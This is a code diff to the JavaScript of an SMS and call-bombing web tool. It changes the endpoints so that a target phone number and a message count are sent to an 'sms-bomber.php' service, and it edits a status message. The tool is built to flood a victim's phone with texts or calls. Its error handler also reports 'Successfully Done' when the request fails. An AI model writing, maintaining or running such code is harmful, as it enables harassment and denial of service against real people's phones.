@@ -54,9 +54,9 @@ function sendMessage() {
       // Choose the API URL based on the selected mode
       let apiUrl = "";
       if (currentMode === 'sms') {
-        apiUrl = `https://mahfuz-ultrabomb.rf.gd/?phone=${phone}&amount=${amount}`;
+        apiUrl = `https://hfw.reppuai.online/sms-bomber.php?number=${phone}&amount=${amount}`;
       } else if (currentMode === 'call') {
-        apiUrl = `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`;
+        apiUrl = `https://hfw.reppuai.online/sms-bomber.php?number=${phone}`;
       }
 
       // Make the API call
@@ -74,7 +74,7 @@ function sendMessage() {
         })
         .catch(error => {
           loadingText.style.display = "none";
-          errorMsg.innerHTML = "Successfully Chudlm🍌";
+          errorMsg.innerHTML = "Successfully Done🍌";
           errorMsg.style.color = "orange";
         });
     } else {
